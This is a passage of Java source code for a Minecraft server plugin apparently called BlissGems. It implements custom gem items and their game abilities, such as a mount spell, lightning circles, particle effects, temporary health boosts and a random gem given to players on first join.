        ItemStack OffHandItem = DimensionalDriftPlayer.getInventory().getItemInOffHand();
        if (AstraGemAbilityDimensionalDrift.getAction() == Action.RIGHT_CLICK_AIR || AstraGemAbilityDimensionalDrift.getAction() == Action.RIGHT_CLICK_BLOCK) {
            if (AstraGem(OffHandItem) || Astragem(OffHandItem)) {
                PersistentDataContainer data = DimensionalDriftPlayer.getPersistentDataContainer();
                boolean DIMENSIONAL_DRIFT = data.getOrDefault(Dimensional_Drift, PersistentDataType.INTEGER, 0) == 1;
                boolean DISABLED_GEM = data.getOrDefault(Disabled_Gem, PersistentDataType.INTEGER, 0) == 1;
                if (!DIMENSIONAL_DRIFT && !DISABLED_GEM) {
                    data.set(Dimensional_Drift, PersistentDataType.INTEGER, 1);
                    ItemMeta meta = OffHandItem.getItemMeta();
                    int customModelData = meta.getCustomModelData();
                    long DimensionalDriftCooldown;
                    switch (customModelData) {
                        case 6:
                            DimensionalDriftCooldown = 18L;
                            break;
                        case 16:
                            DimensionalDriftCooldown = 18L;
                            break;
                        case 26:
                            DimensionalDriftCooldown = 18L;
                            break;
                        case 36:
                            DimensionalDriftCooldown = 18L;
                            break;
                        case 46:
                            DimensionalDriftCooldown = 18L;
                            break;
                        default:
                            return;
                    }
                    AstraGem_Power_4_DimensionalDrift.put(DimensionalDriftPlayer.getUniqueId(), DimensionalDriftCooldown);
                    DimensionalDriftHorse(DimensionalDriftPlayer);
                    DriftHorseDeath();
                }
            }
        }
    }

    @EventHandler
    public void SpeedGemAbilityTerminalAcceleration(PlayerInteractEvent AstraGemAbilityDimensionalDrift) {
        Player TerminalAccelerationPlayer = AstraGemAbilityDimensionalDrift.getPlayer();
        ItemStack SpeedGemItem = TerminalAccelerationPlayer.getInventory().getItemInOffHand();
        if (AstraGemAbilityDimensionalDrift.getAction() == Action.RIGHT_CLICK_AIR || AstraGemAbilityDimensionalDrift.getAction() == Action.RIGHT_CLICK_BLOCK) {
            if (SpeedGem(SpeedGemItem) || Speedgem(SpeedGemItem)) {
                AttributeInstance attackSpeedAttribute = TerminalAccelerationPlayer.getAttribute(Attribute.GENERIC_ATTACK_SPEED);
                attackSpeedAttribute.setBaseValue(6.0);
            }
        }
    }

    @EventHandler
    public void onPlayerConsumeItem(PlayerItemConsumeEvent event) {
        Player player = event.getPlayer();
        ItemStack item = player.getInventory().getItemInMainHand();

        if (item != null && item.getType() == Material.PRISMARINE_SHARD) {
            // Check if the player has the FAST_DIGGING effect
            if (player.hasPotionEffect(PotionEffectType.FAST_DIGGING)) {
                // Simulate faster eating by canceling the event and applying the food effect manually
                event.setCancelled(true);
                ItemStack consumedItem = event.getItem();
                Material foodType = consumedItem.getType();
                applyFoodEffect(player, foodType);

                // Remove one item from the stack
                int amount = consumedItem.getAmount();
                if (amount > 1) {
                    consumedItem.setAmount(amount - 1);
                } else {
                    player.getInventory().removeItem(consumedItem);
                }
            }
        }
    }

    private void applyFoodEffect(Player player, Material foodType) {
        switch (foodType) {
            case BREAD:
                player.setFoodLevel(player.getFoodLevel() + 5);
                player.setSaturation(player.getSaturation() + 6.0f);
                break;
            case COOKED_BEEF:
                player.setFoodLevel(player.getFoodLevel() + 8);
                player.setSaturation(player.getSaturation() + 12.8f);
                break;
            default:
                break;
        }
    }


    private void DimensionalDriftHorse(Player player) {
        DimensionalDriftHorse = (Horse) player.getWorld().spawnEntity(player.getLocation(), EntityType.HORSE);
        DimensionalDriftHorse.setInvulnerable(true);
        DimensionalDriftHorse.setTamed(true);
        DimensionalDriftHorse.setPassenger(player);
        DimensionalDriftHorse.setSilent(true);
        DimensionalDriftHorse.setInvisible(true);
        DimensionalDriftHorse.setAdult();
        DimensionalDriftHorse.setJumpStrength(4.0); // Jump 4 blocks high
        DimensionalDriftHorse.getAttribute(Attribute.GENERIC_MOVEMENT_SPEED).setBaseValue(0.4);
        DimensionalDriftHorse.setHealth(0.5);
        ItemStack saddle = new ItemStack(Material.SADDLE);
        ItemMeta saddleMeta = saddle.getItemMeta();
        if (saddleMeta != null) {
            saddleMeta.setCustomModelData(1);
            saddle.setItemMeta(saddleMeta);
            DimensionalDriftHorse.getInventory().setSaddle(saddle);

        }
    }

    @EventHandler
    public void onEntityMount(EntityMountEvent event) {
        if (event.getEntity() instanceof Player && event.getMount() instanceof Horse) {
            Player player = (Player) event.getEntity();
            Horse horse = (Horse) event.getMount();
            new BukkitRunnable() {
                @Override
                public void run() {
                    if (!horse.isDead() && player.isInsideVehicle() && player.getVehicle() instanceof Horse && horse.equals(DimensionalDriftHorse)) {
                        player.addPotionEffect(new PotionEffect(PotionEffectType.INVISIBILITY, 20, 0, false, false));
                    } else {
                        cancel();
                    }
                }
            }.runTaskTimer(this, 0, 5);
        }
    }

    private void DriftHorseDeath() {
        new BukkitRunnable() {
            @Override
            public void run() {
                if (DimensionalDriftHorse != null && !DimensionalDriftHorse.isDead()) {
                    DimensionalDriftHorse.remove();
                    DimensionalDriftHorse = null;
                }
            }
        }.runTaskLater(this, 10 * 20); // 10 seconds
    }

    @EventHandler
    public void DimensionalDriftHorseDismount(EntityDismountEvent event) {
        Entity entity = event.getEntity();
        Entity dismount = event.getDismounted();
        if (entity instanceof Player && dismount instanceof Horse && dismount.equals(DimensionalDriftHorse)) {
            event.setCancelled(true);
        }
    }


    @EventHandler
    public void PuffGemFallDamage(EntityDamageEvent event) {
        if (event.getEntity() instanceof Player && event.getCause() == EntityDamageEvent.DamageCause.FALL) {
            Player player = (Player) event.getEntity();
            ItemStack mainHandItem = player.getInventory().getItemInMainHand();
            ItemStack offHandItem = player.getInventory().getItemInOffHand();
            if (PuffGem(mainHandItem) || PuffGem(offHandItem)) {
                event.setCancelled(true); // Cancel fall damage for players holding a custom prismarine shard
            }
        }
    }

    @EventHandler
    public void PuffGem(PlayerItemHeldEvent event) {
        Player player = event.getPlayer();
        ItemStack mainHandItem = player.getInventory().getItemInMainHand();
        ItemStack offHandItem = player.getInventory().getItemInOffHand();
        if (PuffGem(mainHandItem) || PuffGem(offHandItem)) {
            player.setFallDistance(0);
        }
    }


    private boolean StrengthGem(ItemStack item) {
        return item != null && item.getType() == Material.PRISMARINE_SHARD && item.hasItemMeta() && ChatColor.stripColor(item.getItemMeta().getDisplayName()).equals("sᴛʀᴇɴɢᴛʜ ɢᴇᴍ");
    }

    private boolean SpeedGem(ItemStack item) {
        return item != null && item.getType() == Material.PRISMARINE_SHARD && item.hasItemMeta() && ChatColor.stripColor(item.getItemMeta().getDisplayName()).equals("sᴘᴇᴇᴅ ɢᴇᴍ");
    }

    private boolean LifeGem(ItemStack item) {
        return item != null && item.getType() == Material.PRISMARINE_SHARD && item.hasItemMeta() && ChatColor.stripColor(item.getItemMeta().getDisplayName()).equals("ʟɪғᴇ ɢᴇᴍ");
    }

    private boolean WealthGem(ItemStack item) {
        return item != null && item.getType() == Material.PRISMARINE_SHARD && item.hasItemMeta() && ChatColor.stripColor(item.getItemMeta().getDisplayName()).equals("ᴡᴇᴀʟᴛʜ ɢᴇᴍ");
    }

    private boolean PuffGem(ItemStack item) {
        return item != null && item.getType() == Material.PRISMARINE_SHARD && item.hasItemMeta() && ChatColor.stripColor(item.getItemMeta().getDisplayName()).equals("ᴘᴜғғ ɢᴇᴍ");
    }

    private boolean AstraGem(ItemStack item) {
        return item != null && item.getType() == Material.PRISMARINE_SHARD && item.hasItemMeta() && ChatColor.stripColor(item.getItemMeta().getDisplayName()).equals("ᴀsᴛʀᴀ ɢᴇᴍ");
    }

    private boolean FireGem(ItemStack item) {
        return item != null && item.getType() == Material.PRISMARINE_SHARD && item.hasItemMeta() && ChatColor.stripColor(item.getItemMeta().getDisplayName()).equals("ғɪʀᴇ ɢᴇᴍ");
    }

    private boolean FluxGem(ItemStack item) {
        return item != null && item.getType() == Material.PRISMARINE_SHARD && item.hasItemMeta() && ChatColor.stripColor(item.getItemMeta().getDisplayName()).equals("ғʟᴜx ɢᴇᴍ");
    }

    private boolean Strengthgem(ItemStack item) {
        return item != null && item.getType() == Material.AMETHYST_SHARD && item.hasItemMeta() && ChatColor.stripColor(item.getItemMeta().getDisplayName()).equals("sᴛʀᴇɴɢᴛʜ ɢᴇᴍ");
    }

    private boolean Speedgem(ItemStack item) {
        return item != null && item.getType() == Material.AMETHYST_SHARD && item.hasItemMeta() && ChatColor.stripColor(item.getItemMeta().getDisplayName()).equals("sᴘᴇᴇᴅ ɢᴇᴍ");
    }

    private boolean Lifegem(ItemStack item) {
        return item != null && item.getType() == Material.AMETHYST_SHARD && item.hasItemMeta() && ChatColor.stripColor(item.getItemMeta().getDisplayName()).equals("ʟɪғᴇ ɢᴇᴍ");
    }

    private boolean Wealthgem(ItemStack item) {
        return item != null && item.getType() == Material.AMETHYST_SHARD && item.hasItemMeta() && ChatColor.stripColor(item.getItemMeta().getDisplayName()).equals("ᴡᴇᴀʟᴛʜ ɢᴇᴍ");
    }

    private boolean Puffgem(ItemStack item) {
        return item != null && item.getType() == Material.AMETHYST_SHARD && item.hasItemMeta() && ChatColor.stripColor(item.getItemMeta().getDisplayName()).equals("ᴘᴜғғ ɢᴇᴍ");
    }

    private boolean Astragem(ItemStack item) {
        return item != null && item.getType() == Material.AMETHYST_SHARD && item.hasItemMeta() && ChatColor.stripColor(item.getItemMeta().getDisplayName()).equals("ᴀsᴛʀᴀ ɢᴇᴍ");
    }

    private boolean Firegem(ItemStack item) {
        return item != null && item.getType() == Material.AMETHYST_SHARD && item.hasItemMeta() && ChatColor.stripColor(item.getItemMeta().getDisplayName()).equals("ғɪʀᴇ ɢᴇᴍ");
    }

    private boolean Fluxgem(ItemStack item) {
        return item != null && item.getType() == Material.AMETHYST_SHARD && item.hasItemMeta() && ChatColor.stripColor(item.getItemMeta().getDisplayName()).equals("ғʟᴜx ɢᴇᴍ");
    }


    @EventHandler
    public void onPlayerInteract(PlayerInteractEvent event) {
        if (event.getAction().toString().contains("RIGHT")) {
            Player player = event.getPlayer();
            ItemStack item = player.getInventory().getItemInMainHand();

            if (item != null && item.getType() == Material.NAUTILUS_SHELL && item.hasItemMeta()) {
                ItemMeta meta = item.getItemMeta();
                if (meta != null && meta.hasCustomModelData() && meta.getCustomModelData() == 300) {
                    player.sendMessage("hi"); // Send message "hi" to the player
                    if (item.getAmount() > 1) {
                        item.setAmount(item.getAmount() - 1); // Decrease the item count by 1
                    } else {
                        player.getInventory().setItemInMainHand(null); // Remove the item if only one is left
                    }
                }
            }
        }
    }

    @EventHandler
    public void GroupPowerCircles(PlayerInteractEntityEvent GroupPowerCircles) {
        Player GroupPowerCirclesPlayer = GroupPowerCircles.getPlayer();
        Entity GroupPowerCirclesVictim = GroupPowerCircles.getRightClicked();
        ItemStack GroupPowersCirclesItem = GroupPowerCirclesPlayer.getInventory().getItemInMainHand();
        if (StrengthGem(GroupPowersCirclesItem)) {
            Location ChadStrengthGroupVictimLocation = GroupPowerCirclesVictim.getLocation();
            GroupPowerCirclesPlayer.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + "\uD83D\uDD2E " + GroupPowerCirclesPlayer.getName() + net.md_5.bungee.api.ChatColor.of(new Color(178, 255, 246)) + " gave you " + ChatColor.WHITE + "⚔" + net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + "Chad Strength " + net.md_5.bungee.api.ChatColor.of(new Color(178, 255, 246)) + "for " + net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + "40 seconds");
            GroupPowerCirclesPlayer.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + "\uD83D\uDD2E " + net.md_5.bungee.api.ChatColor.of(new Color(164, 254, 241)) + "You have activated group " + net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + "⚔Chad Strength " + net.md_5.bungee.api.ChatColor.of(new Color(164, 254, 241)) + "skill " + ChatColor.GRAY + "(radius 3)");
            GroupPowerCirclesVictim.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + "\uD83D\uDD2E " + GroupPowerCirclesPlayer.getName() + net.md_5.bungee.api.ChatColor.of(new Color(178, 255, 246)) + " gave you " + ChatColor.WHITE + "⚔" + net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + "Chad Strength " + net.md_5.bungee.api.ChatColor.of(new Color(178, 255, 246)) + "for " + net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + "40 seconds");
            GroupPowerCircleParticles(ChadStrengthGroupVictimLocation, 241, 3, 3);
        }
        if (SpeedGem(GroupPowersCirclesItem)) {

        }
        if (LifeGem(GroupPowersCirclesItem)) {
            Location PrivilegePrecinctGroupVictimLocation = GroupPowerCirclesVictim.getLocation();
            GroupPowerCirclesPlayer.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(254, 4, 180)) + "\uD83D\uDD2E " + net.md_5.bungee.api.ChatColor.of(new Color(164, 254, 241)) + "You have received a additional " + net.md_5.bungee.api.ChatColor.of(new Color(254, 4, 180)) + "2 hearts " + net.md_5.bungee.api.ChatColor.of(new Color(164, 254, 241)) + "by " + net.md_5.bungee.api.ChatColor.of(new Color(254, 4, 180)) + GroupPowerCirclesPlayer.getName());
            GroupPowerCirclesPlayer.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(254, 4, 180)) + "\uD83D\uDD2E " + net.md_5.bungee.api.ChatColor.of(new Color(164, 254, 241)) + "You have activated " + ChatColor.WHITE + "\uD83D\uDC96" + net.md_5.bungee.api.ChatColor.of(new Color(254, 4, 180)) + "Privilege Precinct " + ChatColor.GRAY + "(radius 3)");
            GroupPowerCirclesVictim.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(254, 4, 180)) + "\uD83D\uDD2E " + net.md_5.bungee.api.ChatColor.of(new Color(164, 254, 241)) + "You have received a additional " + net.md_5.bungee.api.ChatColor.of(new Color(254, 4, 180)) + "2 hearts " + net.md_5.bungee.api.ChatColor.of(new Color(164, 254, 241)) + "by " + net.md_5.bungee.api.ChatColor.of(new Color(254, 4, 180)) + GroupPowerCirclesPlayer.getName());
            GroupPowerCircleParticles(PrivilegePrecinctGroupVictimLocation, 254, 4, 180);
            modifyMaxHealth(player, 30.0, 30.0, 60);
        }
    }


    private void modifyMaxHealth(Player player, double initialHealth, double finalHealth, int durationSeconds) {
        double currentHealth = player.getAttribute(Attribute.GENERIC_MAX_HEALTH).getValue();

        // Check if the current max health is already higher than initialHealth
        if (currentHealth > initialHealth) {
            // If higher, set to initialHealth first
            AttributeModifier modifier = new AttributeModifier(UUID.randomUUID(), "temp_health_reset", initialHealth - currentHealth, AttributeModifier.Operation.ADD_NUMBER);
            player.getAttribute(Attribute.GENERIC_MAX_HEALTH).addModifier(modifier);
        }

        // Apply the health increase
        AttributeModifier modifier = new AttributeModifier(UUID.randomUUID(), "temporary_health_boost", finalHealth - initialHealth, AttributeModifier.Operation.ADD_NUMBER);
        player.getAttribute(Attribute.GENERIC_MAX_HEALTH).addModifier(modifier);

        // Schedule task to remove modifier after duration
        new BukkitRunnable() {
            @Override
            public void run() {
                // Remove the modifier after duration
                player.getAttribute(Attribute.GENERIC_MAX_HEALTH).removeModifier(modifier);

                // Reset to initial health after the temporary boost expires
                AttributeModifier resetModifier = new AttributeModifier(UUID.randomUUID(), "temp_health_reset", initialHealth - finalHealth, AttributeModifier.Operation.ADD_NUMBER);
                player.getAttribute(Attribute.GENERIC_MAX_HEALTH).addModifier(resetModifier);
            }
        }.runTaskLater(this, durationSeconds * 20); // Convert seconds to ticks
    }

    private void damageNearbyEntities(ArmorStand armorStand, double damage) {
        Location location = armorStand.getLocation();
        for (Entity entity : armorStand.getNearbyEntities(2.0, 2.0, 2.0)) { // 2 blocks radius
            if (entity instanceof Player) {
                ((Player) entity).damage(damage);
            }
        }
    }


    @EventHandler
    public void SpeedStormCircle(PlayerInteractEvent SpeedStormCircle) {
        Player SpeedStormCirclePlayer = SpeedStormCircle.getPlayer();
        ItemStack SpeedGemItem = SpeedStormCirclePlayer.getInventory().getItemInMainHand();
        if (SpeedStormCircle.getAction() == Action.RIGHT_CLICK_AIR || SpeedStormCircle.getAction() == Action.RIGHT_CLICK_BLOCK) {
            if (SpeedGem(SpeedGemItem)) {
                PersistentDataContainer data = SpeedStormCirclePlayer.getPersistentDataContainer();
                boolean SPEED_STORM_CIRCLE = data.getOrDefault(Speed_Storm_Circle, PersistentDataType.INTEGER, 0) == 1;
                boolean DISABLED_GEM = data.getOrDefault(Disabled_Gem, PersistentDataType.INTEGER, 0) == 1;
                if (!SPEED_STORM_CIRCLE && !DISABLED_GEM) {
                    data.set(Speed_Storm_Circle, PersistentDataType.INTEGER, 1);

                    Location playerLocation = SpeedStormCircle.getPlayer().getLocation();
                    summonParticles(playerLocation, 254, 253, 23);
                    summonSmokeAbove(playerLocation);
                    AttributeInstance SpeedStormAttackSpeed = SpeedStormCirclePlayer.getAttribute(Attribute.GENERIC_ATTACK_SPEED);
                    SpeedStormAttackSpeed.setBaseValue(6.0);
                    summonRandomLightning(SpeedStormCirclePlayer, playerLocation);


                    SpeedStormCircle.setCancelled(true); // Cancel the interaction to prevent any other actions
                }
            }
        }
    }


    private void summonParticles(Location location, int r, int g, int b) {
        new BukkitRunnable() {
            double radius = 1;
            Random random = new Random();

            @Override
            public void run() {
                if (radius > 5.5) {
                    cancel();
                    new BukkitRunnable() {
                        int durationTicks = 1; // 40 seconds at 20 ticks per second

                        @Override
                        public void run() {
                            if (durationTicks <= 0) {
                                cancel();
                                return;
                            }
                            for (int i = 0; i < 256; i++) {
                                double angle = random.nextDouble() * 360;
                                double radians = Math.toRadians(angle);
                                double x = 5.5 * Math.cos(radians);
                                double z = 5.5 * Math.sin(radians);
                                Location particleLocation = location.clone().add(x, 0, z);

                                Particle.DustOptions dustOptions = new Particle.DustOptions(org.bukkit.Color.fromRGB(r, g, b), 1);
                                location.getWorld().spawnParticle(Particle.REDSTONE, particleLocation, 4, 0, 0, 0, 0, dustOptions);
                                location.getWorld().spawnParticle(Particle.VILLAGER_HAPPY, particleLocation, 4, 0, 0, 0, 1);
                            }
                            durationTicks--;
                        }
                    }.runTaskTimer(BlissGems.this, 0, 10);
                    return;
                }
                for (int i = 0; i < 256; i++) {
                    double angle = random.nextDouble() * 360;
                    double radians = Math.toRadians(angle);
                    double x = radius * Math.cos(radians);
                    double z = radius * Math.sin(radians);
                    Location particleLocation = location.clone().add(x, 0, z);

                    Particle.DustOptions dustOptions = new Particle.DustOptions(org.bukkit.Color.fromRGB(r, g, b), 1);
                    location.getWorld().spawnParticle(Particle.REDSTONE, particleLocation, 4, 0, 0, 0, 0, dustOptions);
                    location.getWorld().spawnParticle(Particle.VILLAGER_HAPPY, particleLocation, 4, 0, 0, 0, 1);
                }
                radius += 0.5;
            }
        }.runTaskTimer(this, 0, 1); // Faster interval for quicker expansion
    }

    private void summonSmokeAbove(Location location) {
        new BukkitRunnable() {
            int ticks = 0;

            @Override
            public void run() {
                if (ticks >= 800) {
                    cancel();
                    return;
                }
                Location smokeLocation = location.clone().add(0, 20, 0);
                smokeLocation.getWorld().spawnParticle(Particle.CAMPFIRE_COSY_SMOKE, smokeLocation, 50, 0.5, 1, 0.5, 0);
                ticks += 20;
            }
        }.runTaskTimer(this, 0, 20); // Re-spawn smoke every second for 40 seconds
    }


    private void summonRandomLightning(Player executor, Location location) {
        new BukkitRunnable() {
            int strikes = 0;

            @Override
            public void run() {
                if (strikes >= 40) {
                    cancel();
                    return;
                }
                double angle = new Random().nextDouble() * 360;
                double radius = new Random().nextDouble() * 5;
                double radians = Math.toRadians(angle);
                double x = radius * Math.cos(radians);
                double z = radius * Math.sin(radians);
                Location lightningLocation = location.clone().add(x, 0, z);
                location.getWorld().strikeLightning(lightningLocation);
                checkAndCancelPlayerMovement(executor, lightningLocation);
                strikes++;
            }
        }.runTaskTimer(this, 0, 20); // One lightning strike every second for 40 seconds
    }


    private void checkAndCancelPlayerMovement(Player executor, Location lightningLocation) {
        for (Player player : lightningLocation.getWorld().getPlayers()) {
            if (player == executor) {
                continue; // Skip the executor
            }
            if (player.getLocation().distanceSquared(lightningLocation) <= 25) { // within radius squared (5 blocks)
                PersistentDataType<Integer, Integer> type = PersistentDataType.INTEGER;
                Integer speedStormCircle = player.getPersistentDataContainer().get(new NamespacedKey(this, "SPEED_STORM_CIRCLE"), type);
                if (speedStormCircle != null && speedStormCircle == 1) {
                    player.setWalkSpeed(0); // Set player walk speed to 0 to prevent movement
                    Bukkit.getScheduler().runTaskLater(this, () -> {
                        player.setWalkSpeed(0.2f); // Restore player walk speed after 2 seconds
                    }, 40); // 40 ticks (2 seconds) delay
                }
            }
        }
        // Check if executor is struck by lightning
        if (executor.getLocation().distanceSquared(lightningLocation) <= 25) { // within radius squared (5 blocks)
            executor.addPotionEffect(new PotionEffect(PotionEffectType.SPEED, 20 * 30, 3)); // Speed 4 for 30 seconds
            executor.addPotionEffect(new PotionEffect(PotionEffectType.FAST_DIGGING, 20 * 30, 2)); // Haste 3 for 30 seconds
        }
    }

    @EventHandler
    public void onPlayerMove(PlayerMoveEvent event) {
        Location to = event.getTo();
        Location from = event.getFrom();

        if (to.getBlockX() != from.getBlockX() || to.getBlockY() != from.getBlockY() || to.getBlockZ() != from.getBlockZ()) {
            double distance = to.distanceSquared(from);
            if (distance > 0 && isWithinStrikeRadius(to)) {
                event.setCancelled(true); // Cancel player movement if struck by lightning
            }
        }
    }

    private boolean isWithinStrikeRadius(Location location) {
        for (Entity entity : location.getWorld().getNearbyEntities(location, 5, 5, 5)) {
            if (entity instanceof LightningStrike) {
                if (entity.getLocation().distanceSquared(location) <= 25) {
                    return true;
                }
            }
        }
        return false;
    }


    private void GroupPowerCircleParticles(Location location, int r, int g, int b) {
        new BukkitRunnable() {
            double radius = 1;
            Random random = new Random();
            int durationTicks = 3 * 1;

            @Override
            public void run() {
                if (radius > 3) {
                    cancel();
                    new BukkitRunnable() {
                        @Override
                        public void run() {
                            if (durationTicks <= 0) {
                                cancel();
                                return;
                            }
                            for (int i = 0; i < 256; i++) {
                                double angle = random.nextDouble() * 360;
                                double radians = Math.toRadians(angle);
                                double x = 3 * Math.cos(radians);
                                double z = 3 * Math.sin(radians);
                                Location particleLocation = location.clone().add(x, 0, z);
                                Particle.DustOptions dustOptions = new Particle.DustOptions(org.bukkit.Color.fromRGB(r, g, b), 1);
                                location.getWorld().spawnParticle(Particle.REDSTONE, particleLocation, 1, 0, 0, 0, 0, dustOptions);
                                location.getWorld().spawnParticle(Particle.VILLAGER_HAPPY, particleLocation, 1, 0, 0, 0, 1);
                            }
                            durationTicks--;
                        }
                    }.runTaskTimer(BlissGems.this, 0, 10);
                    return;
                }
                for (int i = 0; i < 256; i++) {
                    double angle = random.nextDouble() * 360;
                    double radians = Math.toRadians(angle);
                    double x = radius * Math.cos(radians);
                    double z = radius * Math.sin(radians);
                    Location particleLocation = location.clone().add(x, 0, z);
                    Particle.DustOptions dustOptions = new Particle.DustOptions(org.bukkit.Color.fromRGB(r, g, b), 1);
                    location.getWorld().spawnParticle(Particle.REDSTONE, particleLocation, 1, 0, 0, 0, 0, dustOptions);
                    location.getWorld().spawnParticle(Particle.VILLAGER_HAPPY, particleLocation, 1, 0, 0, 0, 1);
                }
                radius += 0.5;
            }
        }.runTaskTimer(BlissGems.this, 0, 1);
    }


    private boolean ChadStrengthCriticalHit(Player player) {
        return !player.isOnGround() && player.getFallDistance() > 0.0f && !player.isInsideVehicle() && !player.isSprinting();
    }

    private class ParticleEffectTask extends BukkitRunnable {
        private final Player player;
        private int redParticleState = 0;

        public ParticleEffectTask(Player player) {
            this.player = player;
        }

        @Override
        public void run() {
            // Particle effect code as before
        }

        public void setRedParticleState(int state) {
            this.redParticleState = state;
        }
    }


    private void PuffPushEntity(Player player, LivingEntity entity) {
        Location playerLocation = entity.getLocation();
        Location entityLocation = player.getLocation();
        double yOffset = 40;
        double speed = 2;
        Vector direction = entityLocation.toVector().subtract(playerLocation.toVector()).normalize();
        Vector velocity = direction.multiply(speed);
        velocity.setY(yOffset);
        entity.setVelocity(velocity);
    }


    private void startBossBarTimer(Player player) {
        bossBar = Bukkit.createBossBar("Unfortunate", BarColor.GREEN, BarStyle.SOLID);
        bossBar.addPlayer(player);
        playerBossBars.put(player, bossBar);
        BukkitTask task = new BukkitRunnable() {
            @Override
            public void run() {
                bossBarDuration--; // Decrease the duration
                if (bossBarDuration <= 0) {

                    removeBossBar(player); // Remove boss bar when duration is up
                    cancel(); // Cancel the task
                    return;
                }
                bossBar.setProgress((double) bossBarDuration / 80.0);
                bossBar.setTitle("Unfortunate"); // Update title
            }
        }.runTaskTimer(this, 0, 20); // Update every second
    }

    private void removeBossBar(Player player) {
        BossBar bossBar = playerBossBars.remove(player.getUniqueId());
        if (bossBar != null) {
            bossBar.removeAll();
            if (player.getPersistentDataContainer().has(UNFORTUNATE, PersistentDataType.INTEGER)) {
                player.getPersistentDataContainer().remove(UNFORTUNATE);
            }
        }
    }

    private void removeAllBossBars() {
        for (BossBar bossBar : playerBossBars.values()) {
            bossBar.removeAll();
        }
        playerBossBars.clear();
    }


    @EventHandler
    public void GemRoll(PlayerJoinEvent GemRoll) {
        Player player = GemRoll.getPlayer();
        PersistentDataContainer data = player.getPersistentDataContainer();
        boolean FIRSTJOIN = data.getOrDefault(FɪʀsᴛJᴏɪɴ, PersistentDataType.INTEGER, 0) == 1;
        boolean Pristine = data.getOrDefault(BʟɪssEɴᴇʀɢʏ_6, PersistentDataType.INTEGER, 0) == 1;
        if (!FIRSTJOIN && !Pristine) {
            int GemRandom = getRandomNumber();
            if (GemRandom == 1) {
                ItemStack StrengthGem = new ItemStack(Material.AMETHYST_SHARD);
                ItemMeta StrengthGemItemMeta = StrengthGem.getItemMeta();
                StrengthGemItemMeta.setDisplayName(net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + "" + ChatColor.BOLD + "sᴛʀᴇɴɢᴛʜ" + " " + ChatColor.GRAY + "ɢᴇᴍ");
                StrengthGemItemMeta.setLore(Arrays.asList(
                        ChatColor.WHITE + "" + ChatColor.BOLD + "ʜᴀᴠᴇ ᴛʜᴇ sᴛʀᴇɴɢᴛʜ ᴏғ ᴀ ᴀʀᴍʏ " + ChatColor.GRAY + "(" + ChatColor.AQUA + "Pristine" + ChatColor.GRAY + ")", net.md_5.bungee.api.ChatColor.of(new Color(255, 228, 171)) + "ᴘᴀssɪᴠᴇs", " " + net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + "\uD83D\uDD3A" + ChatColor.GRAY + " Strength 1, Auto enchants", ChatColor.GRAY + " swords and axes with sharpness 2", "", net.md_5.bungee.api.ChatColor.of(new Color(158, 228, 227)) + "" + ChatColor.BOLD + "ᴀʙɪʟɪᴛʏ", net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + "Shadow Stalker" + ChatColor.GRAY + ": track players like a compass", " " + ChatColor.GRAY + "by using that players items to feed the tracking", ChatColor.WHITE + "", net.md_5.bungee.api.ChatColor.of(new Color(164, 244, 254)) + "" + ChatColor.BOLD + "ᴘᴏᴡᴇʀs", net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + "\uD83D\uDD2E " + ChatColor.WHITE + ChatColor.BOLD + "required"
                ));
                StrengthGemItemMeta.setCustomModelData(10);
                StrengthGem.setItemMeta(StrengthGemItemMeta);
                player.getInventory().addItem(StrengthGem);
                data.set(FɪʀsᴛJᴏɪɴ, PersistentDataType.INTEGER, 1);
                data.set(BʟɪssEɴᴇʀɢʏ_6, PersistentDataType.INTEGER, 1);
            } else if (GemRandom == 2) {
                ItemStack SpeedGem = new ItemStack(Material.AMETHYST_SHARD);
                ItemMeta SpeedGemItemMeta = SpeedGem.getItemMeta();
                SpeedGemItemMeta.setDisplayName(net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + "" + ChatColor.BOLD + "sᴘᴇᴇᴅ" + " " + ChatColor.GRAY + "ɢᴇᴍ");
                SpeedGemItemMeta.setLore(Arrays.asList(
                        ChatColor.WHITE + "" + ChatColor.BOLD + "ᴛᴜʀɴ ɪɴᴛᴏ ᴀ ʙʟᴜʀ " + ChatColor.GRAY + "(" + ChatColor.AQUA + "Pristine" + ChatColor.GRAY + ")", net.md_5.bungee.api.ChatColor.of(new Color(255, 228, 171)) + "ᴘᴀssɪᴠᴇs", net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + " \uD83D\uDD3A" + ChatColor.GRAY + "Speed 2, Immune to soul sand", ChatColor.GRAY + " Auto enchant efficiency 5", ChatColor.GRAY + "", net.md_5.bungee.api.ChatColor.of(new Color(130, 255, 243)) + "" + ChatColor.BOLD + "ᴀʙɪʟɪᴛʏ", net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + "Terminal Acceleration" + ChatColor.GRAY + ": Eating food, crits and", ChatColor.GRAY + " projectiles are consumed  & thrown insanely fast", ChatColor.GRAY + "", net.md_5.bungee.api.ChatColor.of(new Color(173, 255, 243)) + "" + ChatColor.BOLD + "ᴘᴏᴡᴇʀs", net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + "\uD83D\uDD2E " + ChatColor.WHITE + ChatColor.BOLD + "required"
                ));
                SpeedGemItemMeta.setCustomModelData(8);
                SpeedGem.setItemMeta(SpeedGemItemMeta);
                player.getInventory().addItem(SpeedGem);
                data.set(FɪʀsᴛJᴏɪɴ, PersistentDataType.INTEGER, 1);
                data.set(BʟɪssEɴᴇʀɢʏ_6, PersistentDataType.INTEGER, 1);
            } else if (GemRandom == 3) {
                ItemStack LifeGem = new ItemStack(Material.AMETHYST_SHARD);
                ItemMeta LifeGemItemMeta = LifeGem.getItemMeta();
